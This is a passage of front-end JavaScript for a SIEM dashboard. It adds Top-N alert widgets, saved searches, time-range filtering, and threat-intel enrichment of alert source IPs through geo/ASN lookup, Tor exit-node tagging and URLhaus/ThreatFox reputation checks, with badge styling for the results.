  if (typeof siemRefreshAlertsView === 'function') siemRefreshAlertsView();
  if (SIEM.lastResult && SIEM.lastResult.alerts) siemRenderTimelineHisto(SIEM.lastResult.alerts);
}

function siemSyncTimeRangeUI() {
  var row = document.getElementById('siemTimeRangeRow');
  if (!row) return;
  row.querySelectorAll('.siem-tr-btn').forEach(function(btn){
    var p = btn.dataset.preset;
    btn.classList.toggle('active', SIEM_TIMERANGE.preset === p);
  });
}

/* ─── §1.2 Top-N analytics widgets ──────────────────────────────────────── */
function siemEnsureTopNMount() {
  siemEnsureMilestoneAStyles();
  var existing = document.getElementById('siemTopNGrid');
  if (existing) return existing;
  var anchor = document.getElementById('siemSevCounters');
  if (!anchor || !anchor.parentNode) return null;
  var grid = document.createElement('div');
  grid.id = 'siemTopNGrid';
  grid.className = 'siem-topn-grid';
  grid.style.display = 'none';
  /* Insert AFTER the histogram so order is: severity → histogram → range → top-N */
  var histo = document.getElementById('siemHistoWrap');
  var ref = histo ? histo.nextSibling : anchor.nextSibling;
  anchor.parentNode.insertBefore(grid, ref);
  return grid;
}

var TOPN_WIDGETS = [
  { title:'TOP SOURCE IPs',   field:'ip',       getter:function(a){return a.ip;} },
  { title:'TOP ENDPOINTS',    field:'endpoint', getter:function(a){return a.endpoint;} },
  { title:'TOP ATTACK TYPES', field:'type',     getter:function(a){return a.type;} },
  { title:'TOP STATUS CODES', field:'status',   getter:function(a){return a.status;} },
  { title:'TOP USER-AGENTS',  field:'ua',       getter:function(a){return a.ua && a.ua.slice(0,40);} },
  { title:'TOP METHODS',      field:'method',   getter:function(a){return a.method;} },
  /* These two stay empty until Milestone B enrichment populates geo / ASN. */
  { title:'TOP COUNTRIES',    field:'country',  getter:function(a){return a.geo && a.geo.country;}, hideEmpty:true },
  { title:'TOP ASN / PROVIDER', field:'provider', getter:function(a){return a.asnProv && a.asnProv !== 'unknown' ? a.asnProv : null;}, hideEmpty:true },
];

function siemRenderTopN(alerts) {
  var grid = siemEnsureTopNMount();
  if (!grid) return;
  if (!alerts || !alerts.length) {
    grid.style.display = 'none';
    grid.innerHTML = '';
    return;
  }
  grid.style.display = 'grid';
  var html = '';
  TOPN_WIDGETS.forEach(function(w){
    var rows = siemTopN(alerts, w.getter, 7);
    /* Skip widgets that are hideEmpty + no data (don't waste grid space) */
    if (w.hideEmpty && !rows.length) return;
    var max = rows.length ? rows[0][1] : 1;
    html += '<div class="siem-topn-card"><div class="siem-topn-title">' + escHtml(w.title) + '</div>';
    html += '<div class="siem-topn-rows">';
    if (!rows.length) {
      html += '<div class="siem-topn-empty">no data</div>';
    } else {
      rows.forEach(function(r){
        var pct = (r[1] / max) * 100;
        var valStr = String(r[0]);
        /* Use data attributes + .siem-filterable class so the delegated
           click handler picks it up. Inline onclick with JSON.stringify
           breaks for any value containing a double-quote (and HTML attribute
           parsing terminates on the first " inside the JSON-quoted value
           — i.e. EVERY string value, since JSON.stringify always wraps). */
        html += '<button class="siem-topn-row siem-filterable" '+
          'data-field="'+escHtml(w.field)+'" data-val="'+escHtml(valStr)+'" '+
          'title="Click to filter — '+escHtml(w.field)+':'+escHtml(valStr)+'">' +
          '<span class="siem-topn-bar" style="width:'+pct.toFixed(1)+'%"></span>' +
          '<span class="siem-topn-val">' + escHtml(valStr) + '</span>' +
          '<span class="siem-topn-count">'+r[1]+'</span>' +
          '</button>';
      });
    }
    html += '</div></div>';
  });
  grid.innerHTML = html;
}

/* ─── §4.1 Saved searches ───────────────────────────────────────────────── */
function siemSavedSearches() {
  try {
    var v = JSON.parse(localStorage.getItem('sp_siem_saved_searches') || '[]');
    return Array.isArray(v) ? v : [];
  } catch (e) { return []; }
}
function siemSaveSearch(name, query) {
  if (!name || !query) return;
  var arr = siemSavedSearches().filter(function(s){ return s.name !== name; });
  arr.unshift({ name:name, query:query, when:Date.now() });
  localStorage.setItem('sp_siem_saved_searches', JSON.stringify(arr.slice(0,50)));
  siemRenderSavedDropdown();
}
function siemDeleteSearch(name) {
  var arr = siemSavedSearches().filter(function(s){ return s.name !== name; });
  localStorage.setItem('sp_siem_saved_searches', JSON.stringify(arr));
  siemRenderSavedDropdown();
}
function siemApplySaved(name) {
  var s = siemSavedSearches().filter(function(x){ return x.name === name; })[0];
  if (!s) return;
  var input = document.getElementById('siemSearchInput');
  if (input) input.value = s.query;
  if (typeof siemApplySearch === 'function') siemApplySearch();
  siemSavedToggle(false);
}
function siemSavedAddCurrent() {
  var input = document.getElementById('siemSearchInput');
  var q = (input && input.value || '').trim();
  if (!q) { showToast && showToast('Enter a query first.', 'warn'); return; }
  var name = prompt('Name this search:', q.slice(0,40));
  if (!name) return;
  siemSaveSearch(name.trim(), q);
  showToast && showToast('Saved: ' + name, 'success');
}
function siemSavedToggle(force) {
  var dd = document.getElementById('siemSavedDropdown');
  if (!dd) return;
  var open = (force === undefined) ? (dd.style.display === 'none') : !!force;
  dd.style.display = open ? 'block' : 'none';
  if (open) siemRenderSavedDropdown();
}
function siemRenderSavedDropdown() {
  var list = document.getElementById('siemSavedList');
  if (!list) return;
  var arr = siemSavedSearches();
  if (!arr.length) {
    list.innerHTML = '<div class="siem-saved-empty">No saved searches yet. Save your current query above.</div>';
    return;
  }
  /* data-saved-name is read by the delegated handler below. Using a data
     attribute (with escHtml) avoids the inline-onclick + JSON.stringify
     bug where names containing " or ' broke HTML parsing of the attribute. */
  list.innerHTML = arr.map(function(s){
    var nameEsc  = escHtml(s.name);
    var queryEsc = escHtml(s.query);
    return '<div class="siem-saved-row" data-saved-apply="'+nameEsc+'">' +
           '<div style="flex:1;min-width:0">' +
             '<div class="siem-saved-name">'+nameEsc+'</div>' +
             '<div class="siem-saved-q">'+queryEsc+'</div>' +
           '</div>' +
           '<button class="siem-saved-del" title="Delete" data-saved-del="'+nameEsc+'">×</button>' +
           '</div>';
  }).join('');
}

/* Delegated click handler for saved-search rows (set up once). */
(function(){
  if (window._siemSavedSearchDelegated) return;
  window._siemSavedSearchDelegated = true;
  document.addEventListener('click', function(e){
    var del = e.target.closest && e.target.closest('[data-saved-del]');
    if (del) {
      e.stopPropagation();
      siemDeleteSearch(del.getAttribute('data-saved-del'));
      return;
    }
    var apply = e.target.closest && e.target.closest('[data-saved-apply]');
    if (apply) {
      e.stopPropagation();
      siemApplySaved(apply.getAttribute('data-saved-apply'));
    }
  }, true);
})();

function siemEnsureSavedSearchUI() {
  siemEnsureMilestoneAStyles();
  if (document.getElementById('siemSavedWrap')) return;
  var input = document.getElementById('siemSearchInput');
  if (!input) return;
  var bar = input.parentNode;
  if (!bar) return;
  var wrap = document.createElement('span');
  wrap.id = 'siemSavedWrap';
  wrap.className = 'siem-saved-wrap';
  wrap.innerHTML =
    '<button class="siem-saved-btn" onclick="siemSavedToggle()" title="Saved searches">★ Saved</button>' +
    '<div id="siemSavedDropdown" class="siem-saved-dropdown" style="display:none">' +
      '<button class="siem-saved-add" onclick="siemSavedAddCurrent()">+ Save current query</button>' +
      '<div id="siemSavedList"></div>' +
    '</div>';
  bar.appendChild(wrap);
  /* Close dropdown when clicking outside it */
  document.addEventListener('click', function(e){
    var dd = document.getElementById('siemSavedDropdown');
    var w  = document.getElementById('siemSavedWrap');
    if (!dd || !w || dd.style.display === 'none') return;
    if (!w.contains(e.target)) dd.style.display = 'none';
  });
}

/* ─── §4.2 Click-to-filter delegation ────────────────────────────────────── */
document.addEventListener('click', function(e){
  var t = e.target.closest && e.target.closest('.siem-filterable');
  if (!t) return;
  e.stopPropagation();
  e.preventDefault();
  var f = t.getAttribute('data-field');
  var v = t.getAttribute('data-val');
  if (f && v) siemAppendKqlToken(f, v);
}, true);

/* ─── Time-range hooked into siemFilterAlerts (§1.4) ──────────────────────
   We can't easily edit the existing filter without risk, so we monkey-patch
   it once: wrap the original implementation and AND-in the time predicate. */
(function(){
  if (typeof siemFilterAlerts !== 'function' || siemFilterAlerts._tr_wrapped) return;
  var _orig = siemFilterAlerts;
  siemFilterAlerts = function(alerts) {
    var passed = _orig(alerts);
    if (SIEM_TIMERANGE.active && SIEM_TIMERANGE.startMs != null && SIEM_TIMERANGE.endMs != null) {
      passed = passed.filter(function(a){
        var t = Date.parse(a.timestamp);
        return !isNaN(t) && t >= SIEM_TIMERANGE.startMs && t < SIEM_TIMERANGE.endMs;
      });
    }
    return passed;
  };
  siemFilterAlerts._tr_wrapped = true;
})();

/* ─── Keep Top-N + histogram in sync with the filtered set (§1.2) ──────────
   Wrap siemRefreshAlertsView so widgets always reflect the current filter. */
(function(){
  if (typeof siemRefreshAlertsView !== 'function' || siemRefreshAlertsView._tr_wrapped) return;
  var _orig = siemRefreshAlertsView;
  siemRefreshAlertsView = function(){
    _orig.apply(this, arguments);
    var cache = (typeof siemRenderAlertsTable !== 'undefined' &&
                 siemRenderAlertsTable._cache) ? siemRenderAlertsTable._cache : [];
    var filtered = (typeof siemFilterAlerts === 'function') ? siemFilterAlerts(cache) : cache;
    siemRenderTopN(filtered);
  };
  siemRefreshAlertsView._tr_wrapped = true;
})();

/* ─── Initial UI scaffolding when the SIEM view first loads ──────────────── */
(function siemMilestoneAInit(){
  function ready() {
    if (!document.getElementById('view-siem')) {
      setTimeout(ready, 200);
      return;
    }
    siemEnsureMilestoneAStyles();
    siemEnsureHistoMount();
    siemEnsureTimeRangeMount();
    siemEnsureTopNMount();
    siemEnsureSavedSearchUI();
  }
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', ready);
  } else {
    ready();
  }
})();

/* ═══════════════════════════════════════════════════════════════════════════
   MILESTONE B — Threat-intel enrichment (§3.1, §3.2, §3.3 + §1.3 phase A)

   All enrichment runs AFTER the first paint of an analysis result. The
   alert objects are mutated in place so widgets/tables that re-read them
   immediately see new fields. Progress is reported via a small status
   strip near the alerts table title; nothing blocks UI input.

   Persistence (see SIEM_ROADMAP §0.6):
     sp_siem_threatintel_cache   IP rep cache, 24h TTL
     sp_siem_tor_exits           Tor exit list snapshot, 1h TTL

   Concurrency caps live on top of the file (BSPEC) so they're tunable
   without hunting through the body.
═══════════════════════════════════════════════════════════════════════════ */

var BSPEC = {
  ENRICH_MAX_DISTINCT_IPS:   200,        // skip auto-enrich beyond this
  GEO_CONCURRENCY:           5,
  REP_CONCURRENCY:           4,
  REP_TTL_MS:                24 * 3_600_000,
  TOR_TTL_MS:                3_600_000,
  TOR_LIST_URL:              'https://check.torproject.org/torbulkexitlist',
};

/* ─── private/loopback IP guard (don't waste API quota on RFC1918) ──────── */
function siemIsPrivateOrInvalidIp(ip) {
  if (!ip) return true;
  if (typeof isPrivate === 'function') return isPrivate(ip);
  /* Fallback if network.js isPrivate is somehow unavailable */
  return /^(?:10\.|127\.|0\.0\.0\.0|169\.254\.|192\.168\.)/.test(ip)
      || /^172\.(?:1[6-9]|2\d|3[01])\./.test(ip)
      || /^(?:255\.|22[4-9]\.|2[3-5]\d\.)/.test(ip);
}

/* ─── a tiny worker-pool helper used by all three enrichment passes ─────── */
async function _siemPool(items, n, fn) {
  if (!items.length) return;
  var queue = items.slice();
  async function worker() {
    while (queue.length) {
      var it = queue.shift();
      try { await fn(it); } catch (e) { /* swallow per-item failures */ }
    }
  }
  var workers = [];
  for (var i = 0; i < Math.min(n, queue.length); i++) workers.push(worker());
  await Promise.all(workers);
}

/* ─────────────────────────────────────────────────────────────────────────
   §3.3 ASN / hosting classification + Geo
   Populates: a.geo, a.asn, a.asnKind, a.asnProv
   Also adds 'asn:<provider>' to a.tags
───────────────────────────────────────────────────────────────────────── */
async function siemEnrichAsn(alerts, runId, opts) {
  if (!alerts || !alerts.length) return;
  if (typeof ipGeo !== 'function') return;          // network.js not loaded

  var byIp = {};
  alerts.forEach(function(a) {
    if (a.ip && !siemIsPrivateOrInvalidIp(a.ip)) {
      (byIp[a.ip] = byIp[a.ip] || []).push(a);
    }
  });
  var distinct = Object.keys(byIp);
  if (!distinct.length) return;

  var done = 0;
  await _siemPool(distinct, BSPEC.GEO_CONCURRENCY, async function(ip) {
    if (runId !== _SIEM_ENRICH_RUN) return;          // user started new run
    var g = await ipGeo(ip);
    if (!g) { done++; siemEnrichProgress('asn', done, distinct.length); return; }

    var R = { geo: g };
    var c = (typeof classifyTarget === 'function')
      ? classifyTarget(ip, R)
      : { kind:'normal', provider:'unknown' };

    byIp[ip].forEach(function(a) {
      a.geo = {
        country: g.country || null,
        cc:      g.countryCode || null,
        city:    g.city || null,
      };
      if (g.asn || g.org) a.asn = { asn: g.asn || null, org: g.org || null };
      a.asnKind = c.kind;
      a.asnProv = c.provider;
      if (c.kind && c.kind !== 'normal' && c.provider && c.provider !== 'unknown') {
        (a.tags = a.tags || []).push('asn:' + String(c.provider).toLowerCase());
      }
      if (g.isAnycast) (a.tags = a.tags || []).push('anycast');
    });
    done++;
    siemEnrichProgress('asn', done, distinct.length);
  });
}

/* ─────────────────────────────────────────────────────────────────────────
   §3.2 Tor exit-node detection
───────────────────────────────────────────────────────────────────────── */
async function siemLoadTorExits() {
  try {
    var raw = localStorage.getItem('sp_siem_tor_exits');
    var c = raw ? JSON.parse(raw) : null;
    if (c && c.when && (Date.now() - c.when) < BSPEC.TOR_TTL_MS && Array.isArray(c.set)) {
      return new Set(c.set);
    }
  } catch (e) {}
  try {
    var ctrl = (typeof AbortController !== 'undefined') ? new AbortController() : null;
    var to = ctrl ? setTimeout(function(){ ctrl.abort(); }, 8000) : null;
    var r = await fetch(BSPEC.TOR_LIST_URL, ctrl ? { signal: ctrl.signal } : {});
    if (to) clearTimeout(to);
    if (!r.ok) return new Set();
    var txt = await r.text();
    var arr = txt.split(/\r?\n/).map(function(s){ return s.trim(); }).filter(Boolean);
    try {
      localStorage.setItem('sp_siem_tor_exits',
        JSON.stringify({ when: Date.now(), set: arr }));
    } catch (e) {}
    return new Set(arr);
  } catch (e) {
    return new Set();
  }
}

async function siemTagTorExits(alerts, runId) {
  if (!alerts || !alerts.length) return;
  var exits = await siemLoadTorExits();
  if (!exits.size) return;
  if (runId !== _SIEM_ENRICH_RUN) return;
  var tagged = 0;
  alerts.forEach(function(a) {
    if (a.ip && exits.has(a.ip)) {
      (a.tags = a.tags || []).push('tor');
      a.correlation_note = (a.correlation_note ? a.correlation_note + ' / ' : '')
                         + 'Source IP is a known Tor exit node';
      tagged++;
    }
  });
  if (tagged) siemAddLog('Tor: ' + tagged + ' alert(s) from known exit nodes', 'warn');
}

/* ─────────────────────────────────────────────────────────────────────────
   §3.1 IP reputation lookup (URLhaus + ThreatFox)
   Mutates: a.tags += 'known-bad', a.threatIntel = {urlhaus, threatfox}
   Also bumps severity up to HIGH/CRITICAL when match found.
───────────────────────────────────────────────────────────────────────── */
async function siemEnrichIpReputation(alerts, runId) {
  if (!alerts || !alerts.length) return;
  if (typeof urlHausLookup !== 'function' || typeof threatFoxLookup !== 'function') return;

  /* 1. Read-and-prune cache */
  var cache = {};
  try { cache = JSON.parse(localStorage.getItem('sp_siem_threatintel_cache') || '{}'); }
  catch (e) { cache = {}; }

  /* 2. Distinct queryable IPs */
  var byIp = {};
  alerts.forEach(function(a) {
    if (a.ip && !siemIsPrivateOrInvalidIp(a.ip)) {
      (byIp[a.ip] = byIp[a.ip] || []).push(a);
    }
  });
  var distinct = Object.keys(byIp);
  if (!distinct.length) return;

  /* 3. Build the queue: only IPs missing from cache or stale */
  var queue = distinct.filter(function(ip) {
    var c = cache[ip];
    return !c || !c.when || (Date.now() - c.when) > BSPEC.REP_TTL_MS;
  });

  var done = 0;
  await _siemPool(queue, BSPEC.REP_CONCURRENCY, async function(ip) {
    if (runId !== _SIEM_ENRICH_RUN) return;
    var pair = await Promise.all([urlHausLookup(ip), threatFoxLookup(ip)]);
    var uh = pair[0] || {};
    var tf = pair[1] || {};
    cache[ip] = {
      when: Date.now(),
      urlhaus:   uh.found  ? { online: uh.online || 0, offline: uh.offline || 0,
                                threat: uh.threat || null }
                            : null,
      threatfox: tf.found  ? { count:  (tf.iocs || []).length,
                                type:   (tf.iocs && tf.iocs[0] && (tf.iocs[0].threat_type || tf.iocs[0].malware_printable)) || null }
                            : null,
    };
    done++;
    siemEnrichProgress('rep', done, queue.length);
  });

  try { localStorage.setItem('sp_siem_threatintel_cache', JSON.stringify(cache)); }
  catch (e) {}

  /* 4. Apply cache to alerts (covers both freshly-fetched and previously-cached IPs) */
  if (runId !== _SIEM_ENRICH_RUN) return;
  var bumped = 0, hits = 0;
  distinct.forEach(function(ip) {
    var c = cache[ip];
    if (!c || (!c.urlhaus && !c.threatfox)) return;
    byIp[ip].forEach(function(a) {
      (a.tags = a.tags || []).push('known-bad');
      a.threatIntel = { urlhaus: c.urlhaus, threatfox: c.threatfox };
      var ord = (SEV_CONFIG[a.severity] || {}).order || 0;
      if (ord < 3)                                  { a.severity = 'HIGH';     a.severityBumped = true; bumped++; }
      if (ord < 4 && c.urlhaus && c.urlhaus.online > 0) { a.severity = 'CRITICAL'; a.severityBumped = true; }
      hits++;
    });
  });
  if (hits) siemAddLog('Threat-intel: ' + hits + ' alert(s) from known-bad IPs (' + bumped + ' severity-bumped)', 'crit');
}

/* ─────────────────────────────────────────────────────────────────────────
   ORCHESTRATOR — runs after first paint, updates UI as each pass finishes.
───────────────────────────────────────────────────────────────────────── */
var _SIEM_ENRICH_RUN = 0;     // monotonic counter so stale runs can bail

function siemEnrichProgress(stage, done, total) {
  var el = document.getElementById('siemEnrichStatus');
  if (!el) return;
  if (!total) { el.textContent = ''; el.style.display = 'none'; return; }
  var labels = { asn:'Geo / ASN', tor:'Tor exits', rep:'Threat intel' };
  el.style.display = 'inline-block';
  el.textContent = '◴ ' + (labels[stage] || stage) + ' ' + done + '/' + total;
}

function siemEnrichDone() {
  var el = document.getElementById('siemEnrichStatus');
  if (!el) return;
  el.style.display = 'none';
  el.textContent = '';
}

function siemEnsureEnrichStatusEl() {
  if (document.getElementById('siemEnrichStatus')) return;
  /* Mount next to "DETECTED THREATS" section title */
  var titles = document.querySelectorAll('#view-siem .siem-section-title');
  for (var i = 0; i < titles.length; i++) {
    if (/DETECTED\s+THREATS/i.test(titles[i].textContent)) {
      var span = document.createElement('span');
      span.id = 'siemEnrichStatus';
      span.className = 'siem-enrich-status';
      span.style.display = 'none';
      titles[i].appendChild(span);
      return;
    }
  }
}

async function siemRunEnrichment(alerts) {
  if (!alerts || !alerts.length) return;
  var distinctIps = new Set();
  alerts.forEach(function(a){ if (a.ip && !siemIsPrivateOrInvalidIp(a.ip)) distinctIps.add(a.ip); });

  /* Quota-protect: skip auto-run for very large sets — provide manual button */
  if (distinctIps.size === 0) return;
  if (distinctIps.size > BSPEC.ENRICH_MAX_DISTINCT_IPS) {
    siemAddLog('Enrichment skipped — '+distinctIps.size+' distinct IPs > ' +
               BSPEC.ENRICH_MAX_DISTINCT_IPS+'. Use the Enrich button to run manually.', 'warn');
    siemShowEnrichButton(true);
    return;
  }

  siemEnsureEnrichStatusEl();
  var runId = ++_SIEM_ENRICH_RUN;
  siemAddLog('Enrichment started: '+distinctIps.size+' distinct IPs', 'info');

  /* Geo + ASN first (fastest, drives Top Countries widget) */
  await siemEnrichAsn(alerts, runId);
  if (runId !== _SIEM_ENRICH_RUN) return;
  siemEnrichRepaint();

  /* Tor exits next — single fetch, tag many */
  await siemTagTorExits(alerts, runId);
  if (runId !== _SIEM_ENRICH_RUN) return;
  siemEnrichRepaint();

  /* Threat intel last (slowest, two POSTs per IP) */
  await siemEnrichIpReputation(alerts, runId);
  if (runId !== _SIEM_ENRICH_RUN) return;
  siemEnrichRepaint();

  siemEnrichDone();
  siemAddLog('Enrichment complete', 'ok');
}

/* Re-render after each enrichment pass so the user sees progress live. */
function siemEnrichRepaint() {
  /* Severity counters may have shifted */
  if (SIEM.lastResult && SIEM.lastResult.alerts) {
    var sev = {};
    SIEM.lastResult.alerts.forEach(function(a){ sev[a.severity] = (sev[a.severity]||0)+1; });
    if (typeof siemRenderSeverityCounters === 'function')
      siemRenderSeverityCounters(sev);
    if (typeof siemRenderTimelineHisto === 'function')
      siemRenderTimelineHisto(SIEM.lastResult.alerts);
  }
  /* Re-render alerts table preserving the filter */
  if (typeof siemRefreshAlertsView === 'function') siemRefreshAlertsView();
  else if (typeof siemRenderAlertsTable === 'function' && SIEM.lastResult)
    siemRenderAlertsTable(SIEM.lastResult.alerts || []);
}

/* Manual "Enrich now" button shown when auto-skip kicked in */
function siemShowEnrichButton(show) {
  var existing = document.getElementById('siemEnrichManualBtn');
  if (!show) { if (existing) existing.remove(); return; }
  if (existing) return;
  siemEnsureEnrichStatusEl();
  var titles = document.querySelectorAll('#view-siem .siem-section-title');
  for (var i = 0; i < titles.length; i++) {
    if (/DETECTED\s+THREATS/i.test(titles[i].textContent)) {
      var btn = document.createElement('button');
      btn.id = 'siemEnrichManualBtn';
      btn.className = 'siem-enrich-manual-btn';
      btn.textContent = 'Enrich threat-intel';
      btn.title = 'Run geo / ASN / Tor / URLhaus / ThreatFox enrichment on the current alerts';
      btn.onclick = function(){
        btn.remove();
        if (SIEM.lastResult && SIEM.lastResult.alerts) {
          /* Bypass quota guard by calling the inner functions directly */
          var runId = ++_SIEM_ENRICH_RUN;
          (async function() {
            await siemEnrichAsn(SIEM.lastResult.alerts, runId);
            siemEnrichRepaint();
            await siemTagTorExits(SIEM.lastResult.alerts, runId);
            siemEnrichRepaint();
            await siemEnrichIpReputation(SIEM.lastResult.alerts, runId);
            siemEnrichRepaint();
            siemEnrichDone();
          })();
        }
      };
      titles[i].appendChild(btn);
      return;
    }
  }
}

/* ─── Hook enrichment into siemHandleResult — runs AFTER first paint ─────── */
(function(){
  if (typeof siemHandleResult !== 'function' || siemHandleResult._enrich_wrapped) return;
  var _orig = siemHandleResult;
  siemHandleResult = function(data) {
    /* Reset Milestone-A time-range filter on every new analysis. Without
       this, a "5m" filter set on a previous run uses absolute timestamps
       that excluded everything from the new dataset, leaving the table
       blank even though new alerts exist. */
    if (typeof SIEM_TIMERANGE !== 'undefined') {
      SIEM_TIMERANGE.active  = false;
      SIEM_TIMERANGE.preset  = 'all';
      SIEM_TIMERANGE.startMs = null;
      SIEM_TIMERANGE.endMs   = null;
      if (typeof siemSyncTimeRangeUI === 'function') siemSyncTimeRangeUI();
    }
    /* Cancel any in-flight enrichment from a previous run by bumping the
       monotonic counter — workers check this and bail. */
    if (typeof _SIEM_ENRICH_RUN !== 'undefined') _SIEM_ENRICH_RUN++;
    /* Hide any leftover "manual enrich" button from a prior big run. */
    if (typeof siemShowEnrichButton === 'function') siemShowEnrichButton(false);

    _orig.apply(this, arguments);
    if (!data || !data.success || !data.alerts || !data.alerts.length) return;
    /* Defer to the next tick so the initial render is painted first. */
    setTimeout(function(){ siemRunEnrichment(data.alerts); }, 50);
  };
  siemHandleResult._enrich_wrapped = true;
})();

/* ═══════════════════════════════════════════════════════════════════════════
   UI: badge rendering for enrichment results
   We monkey-patch the two existing alert-row renderers (the unfiltered table
   and the filtered version) so each row can display: provider tag, TOR pill,
   KNOWN-BAD chip, and a severity-bumped indicator.
═══════════════════════════════════════════════════════════════════════════ */

function siemEnrichBadges(alert) {
  var html = '';
  if (alert.threatIntel) {
    var src = [];
    if (alert.threatIntel.urlhaus)   src.push('URLhaus' + (alert.threatIntel.urlhaus.online>0?' (active)':''));
    if (alert.threatIntel.threatfox) src.push('ThreatFox');
    html += '<span class="siem-tag siem-tag-bad" title="Known-bad: '+escHtml(src.join(' + '))+'">KNOWN-BAD</span>';
  }
  if (alert.tags && alert.tags.indexOf('tor') !== -1) {
    html += '<span class="siem-tag siem-tag-tor" title="Source IP is a known Tor exit node">TOR</span>';
  }
  if (alert.asnProv && alert.asnProv !== 'unknown' && alert.asnKind && alert.asnKind !== 'normal') {
    var kindClass = 'siem-tag-asn';
    if (alert.asnKind === 'cdn')         kindClass += ' siem-tag-asn-cdn';
    else if (alert.asnKind === 'cloud')  kindClass += ' siem-tag-asn-cloud';
    html += '<span class="siem-tag '+kindClass+'" title="ASN classifier: '+escHtml(alert.asnKind)+'">'+
            escHtml(String(alert.asnProv).toUpperCase())+'</span>';
  }
  if (alert.severityBumped) {
    html += '<span class="siem-bump" title="Severity raised by threat-intel match">↑</span>';
  }
  if (alert.geo && alert.geo.cc) {
    html += '<span class="siem-tag siem-tag-cc siem-filterable" '+
            'data-field="cc" data-val="'+escHtml(alert.geo.cc)+'" '+
            'title="'+escHtml((alert.geo.country || alert.geo.cc) + (alert.geo.city ? ' / '+alert.geo.city : ''))+
            ' — click to filter">'+escHtml(alert.geo.cc)+'</span>';
  }
  return html;
}

/* Inject badges into the IP cell of each rendered alert row.
   We do it as a post-render DOM pass: cleaner than trying to monkey-patch
   the existing string-concat renderers. */
function siemDecorateAlertRows() {
  var tbody = document.getElementById('siemAlertsBody');
  if (!tbody) return;
  var cache = (typeof siemRenderAlertsTable !== 'undefined' &&
               siemRenderAlertsTable._cache) ? siemRenderAlertsTable._cache : [];
  if (!cache.length) return;

  var rows = tbody.querySelectorAll('tr.siem-row');
  rows.forEach(function(tr) {
    var idx = -1;
    /* The row's onclick is "siemToggleDetail(<idx>)" */
    var oc = tr.getAttribute('onclick') || '';
    var m = oc.match(/siemToggleDetail\((\d+)\)/);
    if (m) idx = parseInt(m[1], 10);
    if (idx < 0 || !cache[idx]) return;
    var alert = cache[idx];
    var ipCell = tr.children[2];   /* sev | type | IP | ts | endpoint | score */
    if (!ipCell) return;

    /* Idempotency: clear any previously-injected badge container */
    var prev = ipCell.querySelector('.siem-badge-strip');
    if (prev) prev.remove();

    var badges = siemEnrichBadges(alert);
    if (!badges) return;
    var strip = document.createElement('span');
    strip.className = 'siem-badge-strip';
    strip.innerHTML = badges;
    ipCell.appendChild(strip);
  });
}

/* Wrap the two render functions to call siemDecorateAlertRows after each paint */
(function(){
  if (typeof siemRenderAlertsTable === 'function' && !siemRenderAlertsTable._enrich_decorated) {
    var _orig = siemRenderAlertsTable;
    siemRenderAlertsTable = function() {
      var r = _orig.apply(this, arguments);
      siemDecorateAlertRows();
      return r;
    };
    /* Preserve cache slot used by the original via patch in siem.js L920ish */
    siemRenderAlertsTable._cache    = _orig._cache;
    siemRenderAlertsTable._enrich_decorated = true;
  }
  if (typeof siemRenderAlertsTableFiltered === 'function' && !siemRenderAlertsTableFiltered._enrich_decorated) {
    var _orig2 = siemRenderAlertsTableFiltered;
    siemRenderAlertsTableFiltered = function() {
      var r = _orig2.apply(this, arguments);
      siemDecorateAlertRows();
      return r;
    };
    siemRenderAlertsTableFiltered._enrich_decorated = true;
  }
})();

/* ═══════════════════════════════════════════════════════════════════════════
   CSS for Milestone B badges + status strip
═══════════════════════════════════════════════════════════════════════════ */
(function(){
  if (document.getElementById('siemMilestoneBStyles')) return;
  var s = document.createElement('style');
  s.id = 'siemMilestoneBStyles';
  s.textContent = [
    '.siem-badge-strip{display:inline-flex;flex-wrap:wrap;gap:3px;margin-left:6px;vertical-align:middle}',
    '.siem-tag{display:inline-block;padding:1px 5px;font-size:9px;font-weight:700;font-family:var(--mono,monospace);' +
      'letter-spacing:.04em;border-radius:3px;border:1px solid;line-height:1.4}',
    '.siem-tag-bad{background:rgba(255,107,107,.16);color:#ff6b6b;border-color:rgba(255,107,107,.4)}',
    '.siem-tag-tor{background:rgba(157,123,255,.14);color:#9d7bff;border-color:rgba(157,123,255,.4)}',
    '.siem-tag-asn{background:rgba(125,133,151,.14);color:var(--text2,#7d8597);border-color:rgba(125,133,151,.35)}',
    '.siem-tag-asn-cdn{background:rgba(230,200,77,.12);color:#e6c84d;border-color:rgba(230,200,77,.4)}',
    '.siem-tag-asn-cloud{background:rgba(157,123,255,.12);color:#9d7bff;border-color:rgba(157,123,255,.35)}',
    '.siem-tag-cc{background:rgba(77,196,255,.10);color:#4dc4ff;border-color:rgba(77,196,255,.30);cursor:pointer}',
    '.siem-tag-cc:hover{background:rgba(77,196,255,.20)}',
    '.siem-bump{display:inline-block;color:#ff6b6b;font-weight:900;margin-left:4px;font-size:11px}',
    '.siem-enrich-status{display:inline-block;margin-left:10px;padding:1px 8px;font-size:10px;' +
      'font-family:var(--mono,monospace);color:var(--accent,#4dc4ff);background:rgba(77,196,255,.08);' +
      'border:1px solid rgba(77,196,255,.25);border-radius:3px;letter-spacing:.04em}',
    '.siem-enrich-manual-btn{margin-left:10px;padding:2px 10px;font-size:10px;font-family:var(--mono,monospace);' +
      'background:rgba(255,107,107,.10);color:#ff6b6b;border:1px solid rgba(255,107,107,.35);' +
      'border-radius:4px;cursor:pointer;letter-spacing:.04em}',
    '.siem-enrich-manual-btn:hover{background:rgba(255,107,107,.20)}',
  ].join('\n');
  document.head.appendChild(s);
})();
